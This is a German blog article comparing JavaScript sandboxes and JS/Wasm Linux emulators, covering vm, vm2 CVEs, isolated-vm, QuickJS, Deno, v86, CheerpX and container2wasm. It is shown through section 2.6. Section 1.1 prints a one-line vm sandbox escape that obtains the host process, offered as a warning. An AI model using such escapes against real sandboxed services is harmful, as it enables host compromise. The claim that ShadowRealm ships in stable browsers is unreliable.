---
title: Vergleich der JavaScript-Lösungen für Linux-Kernel-Simulationen
description: Eine tiefgehende Analyse der Nachbildungen von Linux-Umgebungen
  in JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "1O6w9KE2FO4NLbd9vYhqtPTfmAHVq5iRz6SIn9vCWfnZpMsa+1BDuIukdqId7KWmzf/Ct9FyhBQHwcEzO0ImuA=="
---

# Jede JavaScript-Sandbox, jeder Emulator, Simulator und Linux-Honeypot, verglichen

Also gut, ich bin schon eine Weile viel zu tief in diesem Kaninchenbau. Alles begann, weil ich bei [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) mithalf, einem Projekt von Fortune (dazu gleich mehr), und man mich ständig fragte "warte, was ist der Unterschied zu `v86` ?" oder "warum nicht `vm2` nutzen ?" und ich merkte, dass ich keine klare Antwort geben konnte, ohne erst das ganze Ökosystem zu kartieren. Also hier sind wir, schätze ich.

Es stellt sich heraus, dass es vier unterschiedliche Familien gibt, die JS-Sandboxes, Linux-Emulatoren, Linux-Simulatoren und Honeypots, und sie überschneiden sich fast nie, selbst wenn man sie ständig im selben Satz erwähnt. Wer ein Plugin-System baut, nutzt `isolated-vm`. Wer eine CLI-Tool-Demo macht, nutzt `v86`. Wer SSH-Threat-Intel macht, nutzt Cowrie. Sie lösen völlig unterschiedliche Probleme unter demselben vagen Schirm von "Code in einer Box laufen lassen."

Ich habe viel Zeit damit verbracht, Sourcecode, CVE-Reports, Architekturdoks und npm-Seiten zu lesen, um diesen Artikel zu schreiben. Es wird lang, hol dir einen Kaffee, ernsthaft. Oder zwei.

> Kleiner Disclaimer: `typescript-virtual-container` wird in diesem Artikel hervorgehoben, weil es diese Recherche ausgelöst hat. Ich habe versucht, gegenüber allem anderen fair zu sein, aber behalte diesen Kontext im Kopf.

---

## Teil 0, zuerst: Welches Problem löst du wirklich?

Bevor wir eintauchen, lohnt es sich, präzise zu sein, wozu jede Familie nützt, weil die Terminologie schnell matschig wird und Leute ständig alles vermischen (ich eingeschlossen, bevor ich mich hinsetzte und alles sauber kartierte).

**Die JS-Sandboxes** isolieren JavaScript-Code vom Host-Node.js-Prozess. Das Bedrohungsmodell ist: Nicht vertrauenswürdiger JS-Code, der `process.exit()` aufrufen, Dateien lesen oder Kindprozesse starten könnte. Die Lösung ist eine Grenze um die V8-Ausführung. Diese Tools haben keinerlei Begriff von einer Linux-Shell, einem Dateisystem mit Permissions oder SSH.

**Die Linux-Emulatoren** lassen einen echten unmodifizierten Linux-Kernel in einem in JavaScript oder WebAssembly implementierten CPU-Emulator (x86, RISC-V, OR1K) laufen. Du bootest ein echtes OS. Du hast echte Syscalls. Du hast Binärkompatibilität mit für x86 kompilierten Programmen. Die Ressourcenkosten sind enorm.

**Die Linux-Simulatoren** imitieren das *Verhalten* eines Linux-Systems, ohne einen echten Kernel laufen zu lassen. Sie implementieren einen Shell-Interpreter, ein virtuelles Dateisystem und genug Unix-Semantik, um Programme und Menschen zu täuschen. Kein Kernel, kein Wasm, keine CPU-Emulation. Viel weniger Ressourcen.

**Die Honeypots** sind designed, Angreifer anzulocken und aufzuzeichnen, was sie tun. Das sind primär keine Ausführungsumgebungen, das sind Observability-Tools. Die Treue zu realem Linux-Verhalten zählt nur insofern, als sie den Angreifer hindert, die Falle zu erkennen.

Mit diesem Rahmen liegt hier jedes Projekt dieses Artikels:

```
JS-Sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux-Emulator :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux-Simulator : typescript-virtual-container (einzigartig in diesem Raum)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Terminal-Stack :   xterm.js + node-pty (kein Isolator, aber verwandt)
```

---

## Teil 1, die JavaScript-Sandboxes

### 1.1 `vm`, das native Node.js-Modul (nicht was du denkst)

Die älteste Antwort auf "nicht vertrauenswürdiges JS ausführen" in Node ist das native `vm`-Modul. Es existiert seit v0.1, also nutzen es viele Leute zuerst, und verbrennen sich.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Was `vm` wirklich tut: Es erstellt einen neuen V8-Kontext (eine neue Menge nativer Konstruktoren, `Object`, `Array`, `Function` usw.) und führt Code darin aus, mit geteilter Referenz auf das, was du in `sandbox` steckst. Deine V8-Engine ändert sich nicht. Dein Prozess ändert sich nicht. Der Speicher wird geteilt.

Der Grund, warum `vm` keinerlei Sicherheit bietet: JavaScripts Prototypkette ist ein DAG, der alles mit `Object.prototype` verbindet. Wenn du ein Hostwelt-Objekt in die Sandbox steckst, kann der Gast seine Prototypkette hochklettern und die Host-Konstruktoren erreichen. Von `Function` aus kannst du `Function("return process")()` aufrufen und den echten `process` holen. Game over. Wie, sofort.

```js
// Funktioniert perfekt in vm, du holst den echten Prozess zurück
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Ich meine, Node.js' eigene Dokumentation sagt: "Das vm-Modul ist kein Sicherheitsmechanismus. Nutze es nicht, um nicht vertrauenswürdigen Code auszuführen." Diese Warnung steht seit immer da. Leute ignorieren sie ständig. Ich habe Produktionsanwendungen gesehen, die `vm` als Sandbox nutzen. Bitte mach das nicht.

**Verdikt**: Ein Scope-Mechanismus, keine Sandbox. Nutze es, wenn du Variablen isolieren musst (Template-Engines, `eval`-artige Features, wo du den Code kontrollierst). Nie für nicht vertrauenswürdige Inputs.

**Speicher**: Vernachlässigbarer Overhead, derselbe V8-Heap wie der Hostprozess.  
**Sicherheit**: Keine gegen einen motivierten Angreifer.

---

### 1.2 `vm2`, der Community-Versuch, und sein sehr langer Tod

`vm2` war die Community-Antwort auf das `vm`-Escape-Problem. Die Kernidee: Jedes Objekt, das die Sandbox-Grenze überquert, in einen `Proxy` wickeln, der Property-Zugriffe abfängt, Prototyp-Aufstieg blockiert und gefährliche Referenzen filtert. Clevere Idee in der Theorie! In der Praxis erwies sich das Ergebnis als weit weniger überzeugend, wie wir sehen werden.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // wirft VMError, Prozess unerreichbar
```

Mehrere Jahre funktionierte das ziemlich gut. Aber die Angriffsfläche von JavaScript-`Proxy` ist enorm. Jedes neue JS-Sprachfeature, Generatoren, async Iteratoren, `Symbol.toPrimitive`, `Error.prepareStackTrace`, Promises interne Slots, ist ein potenzieller Bypass-Vektor.

Die CVE-Chronologie ist... etwas. So schau dir das an:

| Datum | CVE | Mechanismus |
|------|-----|-----------|
| Okt 2022 | CVE-2022-36067 | Host-Kontext-Escape via `Error.prepareStackTrace` |
| Apr 2023 | CVE-2023-29017 | Host-Objekt-Leak via unbehandeltem Async-Fehler |
| Apr 2023 | CVE-2023-29199 | Exception-Sanitization-Bypass via `handleException()` |
| Apr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Mai 2023 | CVE-2023-32314 | `Proxy` auf `Error.name` → `Function` → RCE |
| Jun 2023 | CVE-2023-37466 | Async-Funktion + Stack Overflow + `Proxy.getPrototypeOf` |
| Jun 2023 | CVE-2023-37903 | Worker Thread + Eval-Escape |

Drei kritische CVEs im selben Monat (April 2023). DREI. IN EINEM MONAT. Nach CVE-2023-37903 hat der Maintainer die Bibliothek offiziell deprecated mit der Nachricht: *"Die Bibliothek enthält kritische Sicherheitsprobleme und sollte nicht in Produktion genutzt werden."*

Der Maintainer hat sie im Oktober 2025 mit Version 3.10.0 wiederbelebt und behauptet, alles damals Bekannte gefixt zu haben. Ein neuer kritischer Escape (CVE-2026-22709, CVSS 9.8) wurde im Januar 2026 disclosed, gefolgt von einem Batch von elf weiteren im Mai 2026. Elf. Das Muster hat sich nicht geändert und ehrlich gesagt glaube ich nicht, dass es sich je ändern wird.

Das fundamentale Problem ist architektonisch, und es ist die Lektion, die das ganze Ökosystem eine Weile zum Lernen brauchte. Du kannst keine sichere Sandbox bauen, indem du dieselbe Sprache nutzt, die du isolierst, auf derselben Engine, im selben Prozess. Die Escape-Fläche ist die gesamte V8-Implementierung, und V8 sind mehrere Millionen Zeilen C++, die sich ständig ändern. Jedes neue JS-Feature öffnet potenziell einen neuen Angriffsweg.

**Verdikt**: Nicht für sicherheitssensible Anwendungen nutzen. Selbst auf der neuesten Version werden alle paar Monate neue Bypasses entdeckt. Der Maintainer selbst hat das offen zugegeben.

---

### 1.3 `isolated-vm`, der, der wirklich funktioniert

`isolated-vm` verfolgt den richtigen Ansatz: V8s native Isolationsprimitive nutzen, das Isolate. Jedes V8-Isolate hat seinen eigenen Heap, seinen eigenen Garbage Collector, seine eigene Menge Natives und null geteilte Referenz mit anderen Isolates.

Das ist dieselbe Grenze, die Chrome zwischen Tabs nutzt. Echte Sicherheitsbarriere, kein auf Proxies gebauter Sprachtrick.

```js
import ivm from "isolated-vm";
```js
import ivm from "isolated-vm";

// Jedes Isolat ist sein eigener V8 Haufen
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB-Grenzwert
const context = await isolate.createContext();
const jail = context.global;

// Daten über die Grenze zu transferieren erfordert eine explizite Serialisierung
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Kann Host-Prozess, Host-Haufen oder Host-Module nicht erreichen
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Du kannst plötzlich auf Zeitout oder Speichergrenze beenden.
isolate.dispose(); // Befreit den ganzen Haufen
```

Die `Reference`- und `ExternalCopy`-Typen sind die explizite Kommunikationsbrücke. Eine `Reference` gibt dem Isolat ein aufrufbares Handle auf eine Host-Funktion, das Isolat kann sie aufrufen, aber ihre Closure oder ihren Prototyp nicht inspizieren. Ein `ExternalCopy` serialisiert einen Wert (strukturierter Klon) über die Heap-Grenze. Dieses explizite Brückenmodell ist unbequem, aber es macht die Isolation real.

Du kannst strikte Ressourcenlimits setzen : Speicher (das Isolat wird beendet, wenn es das Limit übersteigt), Wall-Clock-Timeout und CPU-Timeout. Die Terminierung ist real, sie killt das ganze V8-Isolate, nicht nur einen JS-Timeout, der mit `while(true)` umgangen werden kann.

**Limits** : Es ist nur JS. Du kannst kein Bash darin ausführen. Es gibt keinen Begriff von Dateien, Permissions, Netz oder Prozessen. Genau das richtige Tool für nutzereingereichtes JS (Plugins, Formeln, Skript-Hooks) und das falsche Tool für alles andere. Die Autorin von `typescript-virtual-container` erwähnte, sie habe es anfangs erwogen, bevor sie realisierte, dass "Shell-Commands ausführen" und "JavaScript isolieren" fundamental unterschiedliche Probleme sind.

**Speicher** : ~3-10 MB pro leerem Isolat, wächst mit Heap-Nutzung.  
**Sicherheit** : Solide. Die V8-Isolate-Grenze ist die echte Isolationsprimitive.  
**npm** : [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub** : [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten`, eine separate in Wasm kompilierte JS-Engine

Ein anderer Ansatz : Statt in V8 zu isolieren, eine komplett separate in WebAssembly kompilierte JavaScript-Engine laufen lassen. Der Host läuft in V8/Node. Der Gast läuft in QuickJS-in-Wasm. Die Wasm-Sandbox liefert die Isolationsgrenze.

QuickJS ist noch ein Werk von Fabrice Bellard (derselbe Typ hinter QEMU, FFmpeg, JSLinux, TinyEMU, diese Person ist nicht real, ernsthaft, wie macht eine einzelne Person das alles ?). Es ist eine kleine ES2023-konforme JS-Engine geschrieben in C, und kompiliert zu Wasm sind es nur etwa 500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Wird in QuickJS ausgeführt, komplett getrennt von V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS ist eine kleine ES2023-konforme JavaScript-Engine geschrieben in C. Kompiliert zu Wasm sind es etwa 500 KB für die synchrone Variante, ~1 MB für die asynchrone (Asyncify)-Variante. Speicherverwaltung ist manuell, jeder Wert, den du aus der VM holst, muss explizit freigegeben werden, was etwas nervig ist, aber GC-Überraschungen über Grenzen hinweg verhindert. Ein amüsanter Kompromiss !

Der `@sebastianwessel/quickjs`-Wrapper fügt eine ergonomischere API obendrauf, mit optionalem virtuellem Dateisystem, Fetch-Support und Node-Modul-Stubs :

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Das Sicherheitsmodell unterscheidet sich von `isolated-vm` : Wasm's lineares Speichermodell heißt, der Gast kann nicht direkt auf V8-Heap-Objekte zugreifen. Die Angriffsfläche ist das Host↔Wasm-Interface (Imports/Exports), nicht die ganze JS-Sprache. Generell als robuster betrachtet als Proxy-basierte Sandboxes.

Die Kehrseite : QuickJS hat nicht dasselbe Optimierungslevel wie V8. Für CPU-bound JS-Workloads ist es 5- bis 20-mal langsamer als V8. Für kleine Codeschnipsel und nicht vertrauenswürdige Evaluierungen spielt das generell keine Rolle.

**Speicher** : ~500 KB Wasm-Modul + Heap pro Instanz.  
**Sicherheit** : Wasm-Grenze, als solider betrachtet als Proxy-basierte Ansätze.  
**npm** : [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub** : [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno, eine Runtime, die Permissions zuerst stellt

Deno verfolgt eine völlig andere Philosophie : Statt in Node Sandbox zu machen, eine neue Runtime bauen, die per Default sicher ist. Ich mag diesen Ansatz wirklich, so hätte Node.js von Anfang an sein sollen, ehrlich. Ryan Dahl (Nodes Originalersteller) hat Deno buchstäblich erstellt, weil er manche Node.js-Designentscheidungen bedauerte, was ziemlich verrückt ist, wenn man darüber nachdenkt.

Jede sensible Fähigkeit (Dateilesen, Dateischreiben, Netz, Umgebung, Subprozesse) braucht ein explizites `--allow-*`-Flag :

```bash
# Dieser kann nur in /data lesen, sonst nichts
deno run --allow-read=/data script.ts

# Dieser kann nur auf eine einzige Domain zugreifen
deno run --allow-net=api.example.com script.ts

# Keine Flags = keine Permissions
deno run untrusted.ts # kann nicht lesen, schreiben, Netz, starten
```

Das Permission-Modell ist auf Rust/OS-Ebene implementiert, kein JS-Trick. Wenn Deno-Code `Deno.readFile()` aufruft, geht das durch eine Rust-Op, die die Permission-Tabelle prüft, bevor sie das Dateisystem anfasst. Du kannst es aus JS nicht umgehen, weil der Syscall nie stattfindet, wenn die Permission nicht gewährt ist.

Um wirklich nicht vertrauenswürdigen Code auszuführen, liefern Deno-Worker (Web Worker) ein zweites Isolat im selben Prozess, jedes mit eigenem Permission-Set. Du kannst einen Worker mit null Permissions starten und via `postMessage` mit ihm kommunizieren.

Deno 2 (erschienen Oktober 2024) fügte volle npm-Kompatibilität und Node.js-Kompat-Shims hinzu, was seine Adoption für serverseitige Use Cases erheblich verbesserte.

**Der Kompromiss** : Denos Sicherheitsmodell ist exzellent für Code, dem du teilweise vertrauen könntest. Für komplett nicht vertrauenswürdigen Code, der adversarial sein könnte, hilft das Permission-Modell nicht, du brauchst eine Isolate-Grenze (`isolated-vm`) oder eine andere Engine (`quickjs-emscripten`), weil Deno immer noch V8 nutzt und sophisticierte Angreifer Bugs auf V8-Ebene finden können.

---

### 1.6 TC39 ShadowRealm, die standardisierte Antwort (eines Tages)

JS' Standardisierungsgremium (TC39) hat einen Vorschlag namens ShadowRealm, der versucht zu standardisieren, was `vm` und `vm2` versuchten, aber mit korrektem Sicherheitsmodell. Ein ShadowRealm erstellt einen isolierten JS-Ausführungskontext mit eigenen Intrinsics, keinem Zugriff aufs Außenrealm und sorgfältig kontrolliertem Import/Export-Interface.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Separate Intrinseken, kein Zugang zum äußeren Reich
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm ist in Browsern verfügbar (Chrome 90+, Firefox 105+), aber 2026 noch nicht in stabilem Node.js. Der TC39-Compartments-Vorschlag baut darauf für Isolation auf Modulebene. Das sind die langfristigen standardisierten Antworten, aber sie sind noch nicht bereit für serverseitige Node-Produktion. Eines dieser Vorhaben, die du von Weitem kommen siehst, aber... es ist einfach noch nicht da. Klassisches TC39.

---

### Zusammenfassung der Sandbox-Familie

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Isolationsgrenze** | keine (Scope) | Proxy (gebrochen) | V8-Isolat | Wasm | V8-Isolat + Rust-Perms |
| **Speicherlimit** | ❌ | ❌ | ✅ striktes Limit | ✅ Wasm-Heap | partiell |
| **CPU-Timeout** | ❌ | ✅ (umgehbar) | ✅ strikt | ✅ | ✅ |
| **Sicherheit** | keine | gebrochen | solide | solide | solide |
| **JS-Geschwindigkeit** | natives V8 | natives V8 | natives V8 | ~10x langsamer | natives V8 |
| **Browser** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node-Kompat** | nativ | ✅ | ✅ | partielle Shims | partiell |
| **Status** | stabil | riskant (neue CVEs) | ✅ aktiv | ✅ aktiv | ✅ aktiv |
| **RAM-Overhead** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

Das Verdikt : Wenn dir Sicherheit wichtig ist, gibt es exakt zwei echte Optionen, `isolated-vm` (native Extension, V8-Isolat, volle JS-Geschwindigkeit) und `quickjs-emscripten` (Wasm, browserkompatibel, ~10x langsamer für rechenintensives). Alles andere ist entweder "bitte mach das nicht" (`vm`, `vm2`) oder eine Runtime, die ein völlig anderes Problem löst (Deno). ShadowRealm könnte eines Tages alles ändern, aber noch nicht.

---

## Teil 2, die Linux-Emulatoren in JavaScript

Hier werden die Dinge für mich wirklich interessant. Das sind *echte* Emulatoren, sie implementieren einen CPU-Befehlssatz in JavaScript oder WebAssembly, booten ein echtes Linux-Kernel-Image und führen echte User-Binaries aus. Die Isolation kommt daher, dass Gast und Host nichts teilen : Unterschiedliche Speicherräume, unterschiedliche Befehlsströme.

Der Preis ist enorm, aber was du bekommst, ist wirklich bemerkenswert : Echtes Linux, das wirklich läuft, in deinem Browser oder Node-Prozess. So ziemlich verrückt, wenn man darüber nachdenkt, oder ?

### 2.1 `v86`, x86-PC-Emulator in JS + Wasm-JIT

`v86` von copy (auf GitHub) ist der fähigste Open-Source-x86-Emulator in JavaScript. Er startete um 2013 als purer JS-Interpreter und evolvierte zu einem JIT-System, wo x86-Basisblöcke on the fly zu WebAssembly übersetzt werden, was die Leistung erheblich verbessert.

Was er emuliert :
- **CPU** : x86-32 (IA-32), Befehlssatz etwa Pentium-1-Level. 64-bit (x86-64) bleibt ausgeschlossen, das ist ein architektonisches Hardware-Limit, kein fehlendes Feature.
- **FPU** : Via JavaScripts `Float64Array`. x87 ist 80-bit erweiterte Präzision ; JS-Doubles sind 64-bit. Das heißt, Fließkommaergebnisse können leicht von einer echten CPU abweichen.
- **Speicher** : Konfigurierbar, mappt auf einen `SharedArrayBuffer` oder `ArrayBuffer` im JS-Heap.
- **Hardware** : 8254 PIT (Timer), 8259 PIC (Interrupt-Controller), 8042-Tastaturcontroller (PS/2), CMOS RTC, VGA mit SVGA-Erweiterungen und Bochs VBE, IDE-Controller, Floppy-Controller (8272A), NE2000-Netzkarte.
- **BIOS** : Nutzt SeaBIOS (Open-Source-x86-BIOS).

Das JIT funktioniert, indem es Basisblöcke identifiziert (x86-Befehlssequenzen ohne Sprünge), sie zu einer WebAssembly-Funktion übersetzt, diese Funktion cached und bei folgenden Ausführungen desselben Blocks aufruft. Heiße Codepfade bekommen native Wasm-Leistung. Kalte Pfade fallen auf den JS-Interpreter zurück.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 Mo
  autostart: true,
});

// Serielle Ausgabe erfassen (Linux Kernel console)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Einen Eintrag zum Gast senden (in der Shell taper)
emulator.serial0_send("ls /\n");
```

**Unterstützte OS** : Alpine Linux (exzellent), Ubuntu 16.04/18.04 (nur i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (mit Vorbehalten), MS-DOS.

**Startzeit** : 15-40 Sekunden für Alpine Linux aus sauberem Image. Inhärent an echter Kernel-Initialisierung, du kannst sie nicht überspringen. Ja, deine Nutzer werden einem Linux-Kernel beim Booten in ihrem Browser zuschauen. Das ist der Deal.

**Minimum-Speicher** : 100-256 MB pro Instanz. Allein der Wasm-JIT-Codecache kann für eine beschäftigte Linux-Instanz Dutzende MB erreichen.

**Nutzung in Node.js** : Voll unterstützt. Das DOM bleibt überflüssig, die VGA-Ausgabe kann ignoriert werden, wenn dich nur die serielle Ausgabe interessiert.

**Was du nicht kannst** : 64-bit-Binaries ausführen, moderne Kernelfeatures nutzen (eBPF, io_uring usw.) oder mehr als eine Handvoll Instanzen gleichzeitig laufen lassen, ohne an Speicherlimits zu stoßen.

**npm** : [v86](https://www.npmjs.com/package/v86), kontinuierlich aktualisiert, letzte Publikation noch am selben Tag während ich schreibe.  
**GitHub** : [copy/v86](https://github.com/copy/v86)  
**Demo** : [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux und TinyEMU, Bellards Werk, in zwei Akten

JSLinux ist Fabrice Bellards eigener Linux-Emulator in JavaScript, der allererste, publiziert 2011. Ich erwähne Bellard in diesem Artikel weiter, weil er ständig wiederauftaucht : QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Dieser Typ ist etwas anderes. Wirklich einer der beeindruckendsten individuellen technischen Beiträge der Softwaregeschichte, ohne Übertreibung.

Das originale JSLinux war ein purer JS-x86-Interpreter. 2016 schrieb Bellard TinyEMU (einen RISC-V-Emulator in C), kompilierte ihn via Emscripten zu JavaScript, und das wurde die Basis des aktuellen JSLinux. Das aktuelle JSLinux ist also tatsächlich C-Code, der JavaScript generiert, überhaupt kein handgeschriebenes JS.

Die technischen Notizen auf Bellards Seite sind lesenswert : Das aktuelle JSLinux lässt eine 32- oder 64-bit RISC-V-CPU laufen (kein x86), emuliert eine VirtIO-Konsole, VirtIO-Netz, VirtIO-Blockgerät und ein 9P-Dateisystem zum Dateiteilen mit dem Host. Die JS-Demo ist aus C mit Emscripten kompiliert, kein handgeschriebenes JS.

TinyEMU selbst unterstützt :
- RISC-V RV32IMAFDQC und RV64IMAFDQC (32- und 64-bit, mit Fließkomma, Multiplikation, komprimierten Befehlen)
- x86 via KVM (nur nativ, keine Emulation, also ist die JS-Version nur RISC-V)
- VirtIO-Konsole, Netz, Block, Input, 9P-Dateisystem

TinyEMU hat eine via Emscripten bereitgestellte JavaScript-Demo. Das ist die Basis von JSLinux und wird auch von `container2wasm` genutzt (siehe Abschnitt 2.5).

**JSLinux-Status** : Kein npm-Paket, keine programmierbare API. Es ist eine Demo, die du in deinem Browser öffnest. Historische Bedeutung ist groß, es bewies das Konzept. Praktische Nützlichkeit als Bibliothek : null.

**TinyEMU** : Nicht auf npm, C-Source verfügbar auf [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k, OR1K-Emulator

jor1k ist ein in JavaScript geschriebener OpenRISC-1000-(OR1K-)Emulator von Sebastian Macke. Historisch interessant, weil jor1k VirtIO-9P-Dateisystem-Support einführte, den Bellard danach in TinyEMU und JSLinux integrierte. Die Cross-Pollination zwischen diesen Projekten ist eng, sie borgen sich alle gegenseitig Ideen, was ehrlich gesagt eines der coolsten Dinge an Open-Source-Emulationsarbeit ist.

**Status** : Nicht mehr aktiv gepflegt, kein npm-Paket. Mittlerweile archiviert. Nützlich vor allem für historischen Kontext zu kennen, so wenn jemand jor1k in einer Konversation erwähnt, weißt du jetzt, was es ist :)

---

### 2.4 CheerpX, kommerzieller x86-Emulator für den Browser

CheerpX von Leaning Technologies ist der produktionsreife kommerzielle Linux-x86-Emulator. Nicht Open-Source, aber deutlich fähiger als v86, um echten Debian/Ubuntu-Userspace laufen zu lassen. Wenn du echtes VSCode im Browser brauchst, ist es das.

Schlüsselunterschiede zu v86 :
- Unterstützt eine breitere ISA (mehr x86-Erweiterungen, bessere glibc-Kompatibilität)
- IndexedDB-basiertes Dateisystem im Browser (persistent über Seiten-Reloads)
- Pthread-Support via `SharedArrayBuffer` (das braucht die COOP/COEP-Header, ja diese nervigen Sicherheitsheader)
- Designed, VSCode, Python, Node.js und andere echte Applikationen laufen zu lassen, nicht nur minimale OS-Images
- Professioneller Support und SLA verfügbar (aka du kannst jemanden anmeckern, wenn es bricht)

Der typische Use Case ist "echte Linux-Applikation im Browser laufen lassen ohne Server." Firmen nutzen es für browserbasierte IDEs, Coding-Tutorials und interaktive Dokumentation.

```js
// CheerpX API(vereinfacht)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Geschichte mit Node.js** : CheerpX ist zuerst für den Browser designed. Der darunterliegende Emulator könnte theoretisch in Node funktionieren (es ist Wasm), aber API und Doku sind vollständig auf Browsernutzung orientiert. Serverseitige Nutzung wird nicht unterstützt.

**Speicher** : Ähnlich wie v86, 200+ MB für eine echte Debian-Instanz.  
**Preisgestaltung** : Gratis für Open-Source-Projekte, kommerzielle Lizenz für Produktions-SaaS.  
**Doks** : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz), Node.js in Wasm, keine Linux-Emulation

WebContainers werden oft mit Linux-Emulatoren in denselben Topf geworfen, sind aber architektonisch anders. Sie emulieren kein x86. Sie booten kein Linux. Sie lassen in WebAssembly kompiliertes Node.js mit WASI laufen. Diese Unterscheidung zählt sehr und ich habe viel zu viel Zeit damit verbracht, darüber verwirrt zu sein.

Ich denke, die Verwirrung kommt vom Marketing, "Node.js in deinem Browser laufen lassen" klingt wie Emulation, aber es ist tatsächlich Node.js selbst kompiliert zu Wasm, keine Linux-Emulation, die Node.js in einer VM laufen lässt. Zwei völlig unterschiedliche Architekturen.

Die Architektur :
1. Node.js wird zu Wasm kompiliert (speziell dafür eine custom WASI-Runtime)
2. Ein Service Worker fängt Netz-Requests des emulierten Node.js-Servers ab und routet sie zum Browser-Tab
3. Das Dateisystem lebt im Browserspeicher (keine Platten-I/O)
4. npm ist eine custom für Browsernutzung optimierte Implementierung

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Dateien schreiben
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Node.js-Commands ausführen
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Weil es echtes Node.js ausführt (kompiliert zu Wasm), hast du echtes npm, echte Node.js-APIs und echte Modulauflösung. Du hast keinen generalistischen Linux-Userspace, du kannst keine Systempakete mit `apt` installieren, keine beliebigen kompilierten Binaries ausführen oder viel außerhalb des Node.js-Ökosystems tun.

**Browser-Voraussetzungen** : SharedArrayBuffer (braucht COOP/COEP-Header), Service-Worker-Support, modernes Wasm.

**Geschichte mit Node.js** : Exklusiv für Browsernutzung designed. Die API funktioniert nicht außerhalb eines Browserkontexts.

**npm** : [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**Doks** : [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm, in Wasm kompilierte Docker-Container

`container2wasm` ist ein Tool (kein npm-Paket) von NTT, das ein Docker-Container-Image nimmt und in ein WebAssembly-Binary konvertiert, das in jedem Wasm-Host laufen kann, inklusive Browser. Als ich das zum ersten Mal sah, glaubte ich wirklich nicht, dass es funktioniert.

Der Mechanismus :
- Für x86_64-Container : Bettet Bochs ein (einen x86-Emulator, kompiliert zu Wasm) + das Container-Root-Dateisystem
- Für riscv64-Container : Bettet TinyEMU ein (schon wieder Bellard !) + das Container-Root-Dateisystem
- Das resultierende `.wasm` startet den Emulator, mountet das Container-Dateisystem und führt den Container-Entrypoint aus

```bash
# Ubuntu-22.04-Container zu Wasm konvertieren
c2w ubuntu:22.04 out.wasm

# Ausführen
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Oder für Browsernutzung servieren
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

Das resultierende `.wasm` ist voluminös, ein minimales Ubuntu macht mehrere hundert MB, aber es ist komplett autonom. Du kannst jemandem ein `.wasm` per Mail schicken und er kann Ubuntu in seinem Browser laufen lassen. Dieser Satz sollte keinen Sinn ergeben, aber hier sind wir.

**GitHub** : [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

